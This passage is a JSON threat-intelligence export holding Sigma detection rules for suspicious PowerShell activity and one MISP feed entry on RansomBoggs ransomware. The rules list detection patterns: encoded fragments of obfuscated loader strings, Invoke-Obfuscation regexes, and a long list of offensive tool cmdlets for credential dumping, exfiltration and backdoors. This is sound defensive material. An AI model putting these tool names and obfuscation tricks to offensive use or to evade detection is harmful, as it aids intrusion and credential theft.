8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2023/01/05\nrelated:\n- id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n  type: derived\n- id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n  type: similar\n- id: 536e2947-3729-478c-9903-745aaffe60d2\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Invocations - Specific - PowerShell Module\n",
                            "sigma:id": "8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090",
                            "title": "Suspicious PowerShell Invocations - Specific - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d7326048-328b-4d5e-98af-86e84b17c765",
                        "lookup_data": {
                            "description": "Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/08/11\ndescription: Detects alternate PowerShell hosts potentially bypassing detections looking\n  for powershell.exe\ndetection:\n  condition: selection and not filter\n  filter:\n  - HostApplication|startswith: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  - ContextInfo|contains: Citrix\\ConfigSync\\ConfigSync.ps1\n  selection:\n    HostApplication|contains: '*'\nfalsepositives:\n- Programs using PowerShell directly without invocation of a dedicated interpreter\n- MSP Detection Searcher\n- Citrix ConfigSync.ps1\nid: d7326048-328b-4d5e-98af-86e84b17c765\nlevel: medium\nlogsource:\n  category: ps_classic_start\n  definition: fields have to be extract from event\n  product: windows\nmodified: 2022/10/05\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190815181010.html\nrelated:\n- id: 64e8e417-c19a-475a-8d19-98ea705394cc\n  type: derived\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Alternate PowerShell Hosts\n",
                            "sigma:id": "d7326048-328b-4d5e-98af-86e84b17c765",
                            "title": "Alternate PowerShell Hosts",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9c0295ce-d60d-40bd-bd74-84673b7592b1",
                        "lookup_data": {
                            "description": "Detects suspicious base64 encoded and obbfuscated LOAD string often used for reflection.assembly load",
                            "raw": "author: pH-T (Nextron Systems)\ndate: 2022/03/01\ndescription: Detects suspicious base64 encoded and obbfuscated LOAD string often used\n  for reflection.assembly load\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ\n    - oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA\n    - 6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA\n    - OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ\n    - oAOgAoACIATABvACIAKwAiAGEAZAAiACkA\n    - 6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA\n    - OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ\n    - oAOgAoACIATABvAGEAIgArACIAZAAiACkA\n    - 6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA\n    - OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ\n    - oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA\n    - 6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA\n    - OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ\n    - oAOgAoACcATABvACcAKwAnAGEAZAAnACkA\n    - 6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA\n    - OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ\n    - oAOgAoACcATABvAGEAJwArACcAZAAnACkA\n    - 6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\nid: 9c0295ce-d60d-40bd-bd74-84673b7592b1\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/20\nreferences:\n- https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar\n- https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\nrelated:\n- id: 62b7ccc9-23b4-471e-aa15-6da3663c4d59\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1027\ntitle: Suspicious Encoded Obfuscated LOAD String\n",
                            "sigma:id": "9c0295ce-d60d-40bd-bd74-84673b7592b1",
                            "title": "Suspicious Encoded Obfuscated LOAD String",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a62298a3-1fe0-422f-9a68-ffbcbc5a123d",
                        "lookup_data": {
                            "description": "Detects suspicious command line patterns as seen being used by MERCURY threat actor",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/08/26\ndescription: Detects suspicious command line patterns as seen being used by MERCURY\n  threat actor\ndetection:\n  condition: all of selection*\n  selection_base:\n    CommandLine|contains|all:\n    - -exec bypass -w 1 -enc\n    - UwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAaw\nfalsepositives:\n- Unknown\nid: a62298a3-1fe0-422f-9a68-ffbcbc5a123d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/12\nreferences:\n- https://www.microsoft.com/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.g0069\ntitle: MERCURY Command Line Patterns\n",
                            "sigma:id": "a62298a3-1fe0-422f-9a68-ffbcbc5a123d",
                            "title": "MERCURY Command Line Patterns",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "25676e10-2121-446e-80a4-71ff8506af47",
                        "lookup_data": {
                            "description": "Detects adding and using Exchange PowerShell snap-ins to export mailbox data. As seen used by HAFNIUM and APT27",
                            "raw": "author: FPT.EagleEye, Nasreddine Bencherchali\ndate: 2021/03/03\ndescription: Detects adding and using Exchange PowerShell snap-ins to export mailbox\n  data. As seen used by HAFNIUM and APT27\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains: Add-PSSnapin\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n  selection_module:\n    CommandLine|contains:\n    - Microsoft.Exchange.Powershell.Snapin\n    - Microsoft.Exchange.Management.PowerShell.SnapIn\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 25676e10-2121-446e-80a4-71ff8506af47\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/09\nreferences:\n- https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/\n- https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\n- https://www.intrinsec.com/apt27-analysis/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.collection\n- attack.t1114\ntitle: Exchange PowerShell Snap-Ins Usage\n",
                            "sigma:id": "25676e10-2121-446e-80a4-71ff8506af47",
                            "title": "Exchange PowerShell Snap-Ins Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b2790e3f-e111-4755-b28f-ff902feabb17",
                        "lookup_data": {
                            "description": "Ransomware wave RansomBoggs in Ukraine",
                            "link": "http://www.botvrij.eu/data/feed-osint/b2790e3f-e111-4755-b28f-ff902feabb17.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1669550821",
                            "uuid": "b2790e3f-e111-4755-b28f-ff902feabb17",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f26c6093-6f14-4b12-800f-0fcb46f5ffd0",
                        "lookup_data": {
                            "description": "Detects base64 encoded strings used in hidden malicious PowerShell command lines",
                            "raw": "author: John Lambert (rule)\ndate: 2019/01/16\ndescription: Detects base64 encoded strings used in hidden malicious PowerShell command\n  lines\ndetection:\n  condition: all of selection_*\n  selection_encoded:\n    CommandLine|contains:\n    - AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA\n    - aXRzYWRtaW4gL3RyYW5zZmVy\n    - IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA\n    - JpdHNhZG1pbiAvdHJhbnNmZX\n    - YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg\n    - Yml0c2FkbWluIC90cmFuc2Zlc\n    - AGMAaAB1AG4AawBfAHMAaQB6AGUA\n    - JABjAGgAdQBuAGsAXwBzAGkAegBlA\n    - JGNodW5rX3Npem\n    - QAYwBoAHUAbgBrAF8AcwBpAHoAZQ\n    - RjaHVua19zaXpl\n    - Y2h1bmtfc2l6Z\n    - AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A\n    - kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg\n    - lPLkNvbXByZXNzaW9u\n    - SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA\n    - SU8uQ29tcHJlc3Npb2\n    - Ty5Db21wcmVzc2lvb\n    - AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ\n    - kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA\n    - lPLk1lbW9yeVN0cmVhb\n    - SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A\n    - SU8uTWVtb3J5U3RyZWFt\n    - Ty5NZW1vcnlTdHJlYW\n    - 4ARwBlAHQAQwBoAHUAbgBrA\n    - 5HZXRDaHVua\n    - AEcAZQB0AEMAaAB1AG4Aaw\n    - LgBHAGUAdABDAGgAdQBuAGsA\n    - LkdldENodW5r\n    - R2V0Q2h1bm\n    - AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A\n    - QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA\n    - RIUkVBRF9JTkZPNj\n    - SFJFQURfSU5GTzY0\n    - VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA\n    - VEhSRUFEX0lORk82N\n    - AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA\n    - cmVhdGVSZW1vdGVUaHJlYW\n    - MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA\n    - NyZWF0ZVJlbW90ZVRocmVhZ\n    - Q3JlYXRlUmVtb3RlVGhyZWFk\n    - QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA\n    - 0AZQBtAG0AbwB2AGUA\n    - 1lbW1vdm\n    - AGUAbQBtAG8AdgBlA\n    - bQBlAG0AbQBvAHYAZQ\n    - bWVtbW92Z\n    - ZW1tb3Zl\n  selection_hidden:\n    CommandLine|contains: ' hidden '\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\nfalsepositives:\n- Unknown\nid: f26c6093-6f14-4b12-800f-0fcb46f5ffd0\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/05\nreferences:\n- http://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Malicious Base64 Encoded PowerShell Keywords in Command Lines\n",
                            "sigma:id": "f26c6093-6f14-4b12-800f-0fcb46f5ffd0",
                            "title": "Malicious Base64 Encoded PowerShell Keywords in Command Lines",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9b8d9203-4e0f-4cd9-bb06-4cc4ea6d0e9a",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use MSHTA in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/09\ndescription: Detects Obfuscated Powershell via use MSHTA in Scripts\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains|all:\n    - mshta\n    - vbscript:createobject\n    - .run\n    - window.close\nfalsepositives:\n- Unknown\nid: 9b8d9203-4e0f-4cd9-bb06-4cc4ea6d0e9a\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 7e9c7999-0f9b-4d4a-a6ed-af6d553d4af4\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use MSHTA - Security\n",
                            "sigma:id": "9b8d9203-4e0f-4cd9-bb06-4cc4ea6d0e9a",
                            "title": "Invoke-Obfuscation Via Use MSHTA - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e312efd0-35a1-407f-8439-b8d434b438a6",
                        "lookup_data": {
                            "description": "Detects suspicious encoded character syntax often used for defense evasion",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/07/09\ndescription: Detects suspicious encoded character syntax often used for defense evasion\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: (WCHAR)0x\nfalsepositives:\n- Unknown\nid: e312efd0-35a1-407f-8439-b8d434b438a6\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://twitter.com/0gtweet/status/1281103918693482496\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1027\ntitle: Potential PowerShell Obfuscation Via WCHAR\n",
                            "sigma:id": "e312efd0-35a1-407f-8439-b8d434b438a6",
                            "title": "Potential PowerShell Obfuscation Via WCHAR",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "27aec9c9-dbb0-4939-8422-1742242471d0",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of Environment Variables to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/15\ndescription: Detects Obfuscated use of Environment Variables to execute PowerShell\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - /c\n    - /r\n    CommandLine|contains|all:\n    - cmd\n    - '\"set'\n    - -f\nfalsepositives:\n- Unknown\nid: 27aec9c9-dbb0-4939-8422-1742242471d0\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/17\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation VAR+ Launcher\n",
                            "sigma:id": "27aec9c9-dbb0-4939-8422-1742242471d0",
                            "title": "Invoke-Obfuscation VAR+ Launcher",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2f211361-7dce-442d-b78a-c04039677378",
                        "lookup_data": {
                            "description": "Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the code block cited in the reference section below",
                            "raw": "author: Daniel Bohannon (@Mandiant/@FireEye), oscd.community\ndate: 2019/11/08\ndescription: Detects all variations of obfuscated powershell IEX invocation code generated\n  by Invoke-Obfuscation framework from the code block cited in the reference section\n  below\ndetection:\n  condition: selection_payload\n  selection_payload:\n  - Payload|re: \\$PSHome\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$PSHome\\[\n  - Payload|re: \\$ShellId\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$ShellId\\[\n  - Payload|re: \\$env:Public\\[\\s*\\d{1,3}\\s*\\]\\s*\\+\\s*\\$env:Public\\[\n  - Payload|re: \\$env:ComSpec\\[(\\s*\\d{1,3}\\s*,){2}\n  - Payload|re: \\*mdr\\*\\W\\s*\\)\\.Name\n  - Payload|re: \\$VerbosePreference\\.ToString\\(\n  - Payload|re: \\[String\\]\\s*\\$VerbosePreference\nfalsepositives:\n- Unknown\nid: 2f211361-7dce-442d-b78a-c04039677378\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/12/31\nreferences:\n- https://github.com/danielbohannon/Invoke-Obfuscation/blob/f20e7f843edd0a3a7716736e9eddfa423395dd26/Out-ObfuscatedStringCommand.ps1#L873-L888\nrelated:\n- id: 1b9dc62e-6e9e-42a3-8990-94d7a10007f7\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Obfuscated IEX Invocation - PowerShell Module\n",
                            "sigma:id": "2f211361-7dce-442d-b78a-c04039677378",
                            "title": "Invoke-Obfuscation Obfuscated IEX Invocation - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78",
                        "lookup_data": {
                            "description": "Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell.",
                            "raw": "author: '@Kostastsale, @TheDFIRReport, slightly modified by pH-T (Nextron Systems)'\ndate: 2022/02/12\ndescription: Detects the creation of a schtask that executes a base64 encoded payload\n  stored in the Windows Registry using PowerShell.\ndetection:\n  condition: all of selection*\n  selection1:\n    CommandLine|contains|all:\n    - /Create\n    - /SC\n    - FromBase64String\n    - Get-ItemProperty\n    Image|endswith: \\schtasks.exe\n  selection2:\n    CommandLine|contains:\n    - 'HKCU:'\n    - 'HKLM:'\n    - 'registry::'\n    - HKEY_\nfalsepositives:\n- Unknown\nid: c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/03/15\nreferences:\n- https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nstatus: test\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1053.005\n- attack.t1059.001\ntitle: Scheduled Task Executing Powershell Encoded Payload from Registry\n",
                            "sigma:id": "c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78",
                            "title": "Scheduled Task Executing Powershell Encoded Payload from Registry",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cdf05894-89e7-4ead-b2b0-0a5f97a90f2f",
                        "lookup_data": {
                            "description": "Detects specific combinations of encoding methods in PowerShell via the commandline",
                            "raw": "author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton\ndate: 2020/10/11\ndescription: Detects specific combinations of encoding methods in PowerShell via the\n  commandline\ndetection:\n  condition: selection_img and (all of selection_to_* or 1 of selection_gen_*)\n  selection_gen_1:\n    CommandLine|contains|all:\n    - char\n    - join\n  selection_gen_2:\n    CommandLine|contains|all:\n    - split\n    - join\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n  selection_to_1:\n    CommandLine|contains:\n    - ToInt\n    - ToDecimal\n    - ToByte\n    - ToUint\n    - ToSingle\n    - ToSByte\n  selection_to_2:\n    CommandLine|contains:\n    - ToChar\n    - ToString\n    - String\nfalsepositives:\n- Unknown\nid: cdf05894-89e7-4ead-b2b0-0a5f97a90f2f\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/26\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65\nrelated:\n- id: 5b572dcf-254b-425c-a8c5-d9af6bea35a6\n  type: similar\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Potential Encoded PowerShell Patterns In CommandLine\n",
                            "sigma:id": "cdf05894-89e7-4ead-b2b0-0a5f97a90f2f",
                            "title": "Potential Encoded PowerShell Patterns In CommandLine",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "dcf2db1f-f091-425b-a821-c05875b8925a",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of Environment Variables to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/15\ndescription: Detects Obfuscated use of Environment Variables to execute PowerShell\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains:\n    - /c\n    - /r\n    ServiceFileName|contains|all:\n    - cmd\n    - '\"set'\n    - -f\nfalsepositives:\n- Unknown\nid: dcf2db1f-f091-425b-a821-c05875b8925a\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 8ca7004b-e620-4ecb-870e-86129b5b8e75\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation VAR+ Launcher - Security\n",
                            "sigma:id": "dcf2db1f-f091-425b-a821-c05875b8925a",
                            "title": "Invoke-Obfuscation VAR+ Launcher - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
                        "lookup_data": {
                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
                            "raw": "author: Sean Metcalf, Florian Roth, Bartlomiej Czyz @bczyz1, oscd.community, Nasreddine\n  Bencherchali, Tim Shelton, Mustafa Kaan Demir, Georg Lauenstein, Max Altgelt, Tobias\n  Michalski, Austin Songer\ndate: 2017/03/05\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_1:\n    ScriptBlockText|contains:\n    - Get-SystemDriveInfo\n    - C:\\ProgramData\\Amazon\\EC2-Windows\\Launch\\Module\\\n  filter_2:\n    ScriptBlockText|startswith: '# Copyright 2016 Amazon.com, Inc. or its affiliates.\n      All Rights Reserved'\n  selection:\n    ScriptBlockText|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n  type: similar\n- id: 02030f2f-6199-49ec-b258-ea71b07e03dc\n  type: similar\n- id: 6d3f1399-a81c-4409-aff3-1ecfe9330baf\n  type: obsoletes\n- id: 83083ac6-1816-4e76-97d7-59af9a9ae46e\n  type: obsoletes\nstatus: test\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - ScriptBlock\n",
                            "sigma:id": "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
                            "title": "Malicious PowerShell Commandlets - ScriptBlock",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5",
                        "lookup_data": {
                            "description": "Detects the use of PSAttack PowerShell hack tool",
